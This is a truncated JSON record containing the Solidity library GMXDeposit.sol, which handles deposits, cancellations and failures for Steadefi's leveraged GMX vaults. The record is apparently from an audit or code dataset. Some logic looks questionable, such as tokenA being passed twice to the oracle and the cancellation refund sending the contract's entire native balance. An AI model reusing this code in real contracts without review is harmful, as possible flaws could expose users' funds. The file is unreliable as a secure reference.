      "filename": "contracts/strategy/gmx/GMXDeposit.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { IDeposit } from \"../../interfaces/protocols/gmx/IDeposit.sol\";\nimport { IWithdrawal } from \"../../interfaces/protocols/gmx/IWithdrawal.sol\";\nimport { IEvent } from \"../../interfaces/protocols/gmx/IEvent.sol\";\nimport { IOrder } from \"../../interfaces/protocols/gmx/IOrder.sol\";\nimport { ISwap } from  \"../../interfaces/swap/ISwap.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\nimport { GMXManager } from \"./GMXManager.sol\";\nimport { GMXProcessDeposit } from \"./GMXProcessDeposit.sol\";\n\n/**\n  * @title GMXDeposit\n  * @author Steadefi\n  * @notice Re-usable library functions for deposit operations for Steadefi leveraged vaults\n*/\nlibrary GMXDeposit {\n  using SafeERC20 for IERC20;\n\n  /* ======================= CONSTANTS ======================= */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n\n  /* ======================== EVENTS ========================= */\n\n  event DepositCreated(\n    address indexed user,\n    address asset,\n    uint256 assetAmt\n  );\n  event DepositCompleted(\n    address indexed user,\n    uint256 shareAmt,\n    uint256 equityBefore,\n    uint256 equityAfter\n  );\n  event DepositCancelled(\n    address indexed user\n  );\n  event DepositFailed(bytes reason);\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n    * @param isNative Boolean as to whether user is depositing native asset (e.g. ETH, AVAX, etc.)\n  */\n  function deposit(\n    GMXTypes.Store storage self,\n    GMXTypes.DepositParams memory dp,\n    bool isNative\n  ) external {\n    // Sweep any tokenA/B in vault to the temporary trove for future compouding and to prevent\n    // it from being considered as part of depositor's assets\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n      self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n      self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.HealthParams memory _hp;\n\n    _hp.equityBefore = GMXReader.equityValue(self);\n    _hp.lpAmtBefore = GMXReader.lpAmt(self);\n    _hp.debtRatioBefore = GMXReader.debtRatio(self);\n    _hp.deltaBefore = GMXReader.delta(self);\n\n    // Transfer assets from user to vault\n    if (isNative) {\n      GMXChecks.beforeNativeDepositChecks(self, dp);\n\n      self.WNT.deposit{ value: dp.amt }();\n    } else {\n      IERC20(dp.token).safeTransferFrom(msg.sender, address(this), dp.amt);\n    }\n\n    GMXTypes.DepositCache memory _dc;\n\n    _dc.user = payable(msg.sender);\n\n    if (dp.token == address(self.lpToken)) {\n      // If LP token deposited\n      _dc.depositValue = self.gmxOracle.getLpTokenValue(\n        address(self.lpToken),\n        address(self.tokenA),\n        address(self.tokenA),\n        address(self.tokenB),\n        false,\n        false\n      )\n      * dp.amt\n      / SAFE_MULTIPLIER;\n    } else {\n      // If tokenA or tokenB deposited\n      _dc.depositValue = GMXReader.convertToUsdValue(\n        self,\n        address(dp.token),\n        dp.amt\n      );\n    }\n    _dc.depositParams = dp;\n    _dc.healthParams = _hp;\n\n    self.depositCache = _dc;\n\n    GMXChecks.beforeDepositChecks(self, _dc.depositValue);\n\n    self.status = GMXTypes.Status.Deposit;\n\n    self.vault.mintFee();\n\n    // Borrow assets and create deposit in GMX\n    (\n      uint256 _borrowTokenAAmt,\n      uint256 _borrowTokenBAmt\n    ) = GMXManager.calcBorrow(self, _dc.depositValue);\n\n    _dc.borrowParams.borrowTokenAAmt = _borrowTokenAAmt;\n    _dc.borrowParams.borrowTokenBAmt = _borrowTokenBAmt;\n\n    GMXManager.borrow(self, _borrowTokenAAmt, _borrowTokenBAmt);\n\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n      self,\n      _dc.depositValue,\n      dp.slippage\n    );\n    _alp.executionFee = dp.executionFee;\n\n    _dc.depositKey = GMXManager.addLiquidity(\n      self,\n      _alp\n    );\n\n    self.depositCache = _dc;\n\n    emit DepositCreated(\n      _dc.user,\n      _dc.depositParams.token,\n      _dc.depositParams.amt\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDeposit(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessDepositChecks(self);\n\n    // We transfer the core logic of this function to GMXProcessDeposit.processDeposit()\n    // to allow try/catch here to catch for any issues or any checks in afterDepositChecks() failing.\n    // If there are any issues, a DepositFailed event will be emitted and processDepositFailure()\n    // should be triggered to refund assets accordingly and reset the vault status to Open again.\n    try GMXProcessDeposit.processDeposit(self) {\n      // Mint shares to depositor\n      self.vault.mint(self.depositCache.user, self.depositCache.sharesToUser);\n\n      self.status = GMXTypes.Status.Open;\n\n      emit DepositCompleted(\n        self.depositCache.user,\n        self.depositCache.sharesToUser,\n        self.depositCache.healthParams.equityBefore,\n        self.depositCache.healthParams.equityAfter\n      );\n    } catch (bytes memory reason) {\n      self.status = GMXTypes.Status.Deposit_Failed;\n\n      emit DepositFailed(reason);\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDepositCancellation(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessDepositCancellationChecks(self);\n\n    // Repay borrowed assets\n    GMXManager.repay(\n      self,\n      self.depositCache.borrowParams.borrowTokenAAmt,\n      self.depositCache.borrowParams.borrowTokenBAmt\n    );\n\n    // Return user's deposited asset\n    // If native token is being withdrawn, we convert wrapped to native\n    if (self.depositCache.depositParams.token == address(self.WNT)) {\n      self.WNT.withdraw(self.WNT.balanceOf(address(this)));\n      (bool success, ) = self.depositCache.user.call{value: address(this).balance}(\"\");\n      require(success, \"Transfer failed.\");\n    } else {\n      // Transfer requested withdraw asset to user\n      IERC20(self.depositCache.depositParams.token).safeTransfer(\n        self.depositCache.user,\n        self.depositCache.depositParams.amt\n      );\n    }\n\n    self.status = GMXTypes.Status.Open;\n\n    emit DepositCancelled(self.depositCache.user);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processDepositFailure(\n    GMXTypes.Store storage self,\n    uint256 slippage,\n    uint256 executionFee\n  ) external {\n    GMXChecks.beforeProcessAfterDepositFailureChecks(self);\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // If current LP amount is somehow less or equal to amount before, we do not remove any liquidity\n    if (GMXReader.lpAmt(self) <= self.depositCache.healthParams.lpAmtBefore) {\n      processDepositFailureLiquidityWithdrawal(self);\n    } else {\n      // Remove only the newly added LP amount\n      _rlp.lpAmt = GMXReader.lpAmt(self) - self.depositCache.healthParams.lpAmtBefore;\n\n      // If delta strategy is Long, remove all in tokenB to make it more\n      // efficent to repay tokenB debt as Long strategy only borrows tokenB\n      if (self.delta == GMXTypes.Delta.Long) {\n        address[] memory _tokenASwapPath = new address[](1);\n        _tokenASwapPath[0] = address(self.lpToken);\n        _rlp.tokenASwapPath = _tokenASwapPath;\n\n        (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n          self,\n          _rlp.lpAmt,\n          address"
    }
  ]
}